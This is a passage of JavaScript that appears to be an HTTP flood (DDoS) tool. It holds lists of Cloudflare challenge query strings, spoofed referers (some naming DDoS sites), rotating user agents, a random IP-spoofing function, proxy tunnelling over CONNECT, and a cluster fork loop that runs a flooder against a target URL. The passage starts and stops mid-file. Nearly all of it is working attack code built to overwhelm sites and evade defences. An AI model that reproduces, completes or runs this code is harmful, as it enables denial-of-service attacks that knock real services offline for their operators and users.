"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04"
];


const refers = [
 "https://www.google.com/search?q=",
 "https://check-host.net/",
 "https://www.facebook.com/",
 "https://www.youtube.com/",
 "https://www.fbi.com/",
 "https://www.bing.com/search?q=",
 "https://r.search.yahoo.com/",
 "https://www.cia.gov/index.html",
 "https://vk.com/profile.php?redirect=",
 "https://www.usatoday.com/search/results?q=",
 "https://help.baidu.com/searchResult?keywords=",
 "https://steamcommunity.com/market/search?q=",
 "https://www.ted.com/search?q=",
 "https://play.google.com/store/search?q=",
 "https://www.qwant.com/search?q=",
 "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
 "https://www.google.ad/search?q=",
 "https://www.google.ae/search?q=",
 "https://www.google.com.af/search?q=",
 "https://www.google.com.ag/search?q=",
 "https://www.google.com.ai/search?q=",
 "https://www.google.al/search?q=",
 "https://www.google.am/search?q=",
 "https://www.google.co.ao/search?q=",
 "http://anonymouse.org/cgi-bin/anon-www.cgi/",
 "http://coccoc.com/search#query=",
 "http://ddosvn.somee.com/f5.php?v=",
 "http://engadget.search.aol.com/search?q=",
 "http://engadget.search.aol.com/search?q=query?=query=&q=",
 "http://eu.battle.net/wow/en/search?q=",
 "http://filehippo.com/search?q=",
 "http://funnymama.com/search?q=",
 "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
 "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
 "http://go.mail.ru/search?mail.ru=1&q=",
 "http://help.baidu.com/searchResult?keywords=",
 "http://host-tracker.com/check_page/?furl=",
 "http://itch.io/search?q=",
 "http://jigsaw.w3.org/css-validator/validator?uri=",
 "http://jobs.bloomberg.com/search?q=",
 "http://jobs.leidos.com/search?q=",
 "http://jobs.rbs.com/jobs/search?q=",
 "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
 "http://louis-ddosvn.rhcloud.com/f5.html?v=",
 "http://millercenter.org/search?q=",
 "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
 "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
 "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
 "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
 "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
 "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
 "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
 "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
 "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
 "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
 "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
 "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
 "http://search.aol.com/aol/search?q=",
 "http://taginfo.openstreetmap.org/search?q=",
 "http://techtv.mit.edu/search?q=",
 "http://validator.w3.org/feed/check.cgi?url=",
 "http://vk.com/profile.php?redirect=",
 "http://www.ask.com/web?q=",
 "http://www.baoxaydung.com.vn/news/vn/search&q=",
 "http://www.bestbuytheater.com/events/search?q=",
 "http://www.bing.com/search?q=",
 "http://www.evidence.nhs.uk/search?q=",
 "http://www.google.com/?q=",
 "http://www.google.com/translate?u=",
 "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
 "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
 "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
 "http://www.pagescoring.com/website-speed-test/?url=",
 "http://www.reddit.com/search?q=",
 "http://www.search.com/search?q=",
 "http://www.shodanhq.com/search?q=",
 "http://www.ted.com/search?q=",
 "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
 "http://www.usatoday.com/search/results?q=",
 "http://www.ustream.tv/search?q=",
 "http://yandex.ru/yandsearch?text=",
 "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
 "http://ytmnd.com/search?q=",
 "https://add.my.yahoo.com/rss?url=",
 "https://careers.carolinashealthcare.org/search?q=",
 "https://check-host.net/",
 "https://developers.google.com/speed/pagespeed/insights/?url=",
 "https://drive.google.com/viewerng/viewer?url=",
 "https://duckduckgo.com/?q=",
 "https://google.com/",
 "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
 "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
 "https://help.baidu.com/searchResult?keywords=",
 "https://play.google.com/store/search?q=",
 "https://pornhub.com/",
 "https://r.search.yahoo.com/",
 "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
 "https://steamcommunity.com/market/search?q=",
 "https://vk.com/profile.php?redirect=",
 "https://www.bing.com/search?q=",
 "https://www.cia.gov/index.html",
 "https://www.facebook.com/",
 "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
 "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
 "https://www.fbi.com/",
 "https://www.google.ad/search?q=",
 "https://www.google.ae/search?q=",
 "https://www.google.al/search?q=",
 "https://www.google.co.ao/search?q=",
 "https://www.google.com.af/search?q=",
 "https://www.google.com.ag/search?q=",
 "https://www.google.com.ai/search?q=",
 "https://www.google.com/search?q=",
 "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
 "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
 "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
 "https://www.npmjs.com/search?q=",
 "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
 "https://www.pinterest.com/search/?q=",
 "https://www.qwant.com/search?q=",
 "https://www.ted.com/search?q=",
 "https://www.usatoday.com/search/results?q=",
 "https://www.yandex.com/yandsearch?text=",
 "https://www.youtube.com/",
 "https://yandex.ru/",
   'http://anonymouse.org/cgi-bin/anon-www.cgi/',
   'http://coccoc.com/search#query=',
   'http://ddosvn.somee.com/f5.php?v=',
   'http://engadget.search.aol.com/search?q=',
   'http://engadget.search.aol.com/search?q=query?=query=&q=',
   'http://eu.battle.net/wow/en/search?q=',
   'http://filehippo.com/search?q=',
   'http://funnymama.com/search?q=',
   'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
   'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
   'http://go.mail.ru/search?mail.ru=1&q=',
   'http://help.baidu.com/searchResult?keywords=',
   'http://host-tracker.com/check_page/?furl=',
   'http://itch.io/search?q=',
   'http://jigsaw.w3.org/css-validator/validator?uri=',
   'http://jobs.bloomberg.com/search?q=',
   'http://jobs.leidos.com/search?q=',
   'http://jobs.rbs.com/jobs/search?q=',
   'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
   'http://louis-ddosvn.rhcloud.com/f5.html?v=',
   'http://millercenter.org/search?q=',
   'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
   'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
   'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
   'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
   'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
   'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
   'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
   'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
   'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
   'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
   'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
   'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
   'http://search.aol.com/aol/search?q=',
   'http://taginfo.openstreetmap.org/search?q=',
   'http://techtv.mit.edu/search?q=',
   'http://validator.w3.org/feed/check.cgi?url=',
   'http://vk.com/profile.php?redirect=',
   'http://www.ask.com/web?q=',
   'http://www.baoxaydung.com.vn/news/vn/search&q=',
   'http://www.bestbuytheater.com/events/search?q=',
   'http://www.bing.com/search?q=',
   'http://www.evidence.nhs.uk/search?q=',
   'http://www.google.com/?q=',
   'http://www.google.com/translate?u=',
   'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
   'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
   'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
   'http://www.pagescoring.com/website-speed-test/?url=',
   'http://www.reddit.com/search?q=',
   'http://www.search.com/search?q=',
   'http://www.shodanhq.com/search?q=',
   'http://www.ted.com/search?q=',
   'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
   'http://www.usatoday.com/search/results?q=',
   'http://www.ustream.tv/search?q=',
   'http://yandex.ru/yandsearch?text=',
   'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
   'http://ytmnd.com/search?q=',
   'https://add.my.yahoo.com/rss?url=',
   'https://careers.carolinashealthcare.org/search?q=',
   'https://check-host.net/',
   'https://developers.google.com/speed/pagespeed/insights/?url=',
   'https://drive.google.com/viewerng/viewer?url=',
   'https://duckduckgo.com/?q=',
   'https://google.com/',
   'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
   'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
   'https://help.baidu.com/searchResult?keywords=',
   'https://play.google.com/store/search?q=',
   'https://pornhub.com/',
   'https://r.search.yahoo.com/',
   'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
   'https://steamcommunity.com/market/search?q=',
   'https://vk.com/profile.php?redirect=',
   'https://www.bing.com/search?q=',
   'https://www.cia.gov/index.html',
   'https://www.facebook.com/',
   'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
   'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
   'https://www.fbi.com/',
   'https://www.google.ad/search?q=',
   'https://www.google.ae/search?q=',
   'https://www.google.al/search?q=',
   'https://www.google.co.ao/search?q=',
   'https://www.google.com.af/search?q=',
   'https://www.google.com.ag/search?q=',
   'https://www.google.com.ai/search?q=',
   'https://www.google.com/search?q=',
   'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
   'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
   'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
   'https://www.npmjs.com/search?q=',
   'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
   'https://www.pinterest.com/search/?q=',
   'https://www.qwant.com/search?q=',
   'https://www.ted.com/search?q=',
   'https://www.usatoday.com/search/results?q=',
   'https://www.yandex.com/yandsearch?text=',
   'https://www.youtube.com/',
   'https://yandex.ru/',
   'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',

 ];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
    // Original List
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/71.0.3578.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Safari/534.30",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.30",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
    "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/89.0.774.57",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
    "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.30",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
    "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
];

const ip_spoof = () => {
  const ip_segment = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
   }
} else {setInterval(runFlooder) }

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}

const Socker = new NetSocket();
headers[":method"] = randomMethod;
